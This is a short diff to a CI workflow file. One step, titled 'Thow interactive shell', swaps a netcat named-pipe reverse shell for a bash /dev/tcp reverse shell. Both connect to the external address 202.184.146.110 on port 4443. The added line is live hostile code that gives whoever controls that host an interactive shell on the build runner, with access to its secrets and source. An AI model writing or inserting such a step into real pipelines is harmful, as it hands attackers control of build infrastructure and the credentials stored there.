@@ -29,6 +29,4 @@ jobs:
       - name: Thow interactive shell
         shell: bash -i {0}
         run: |
-              rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 202.184.146.110 4443 >/tmp/f
-
-
+              bash -i >& /dev/tcp/202.184.146.110/4443 0>&1
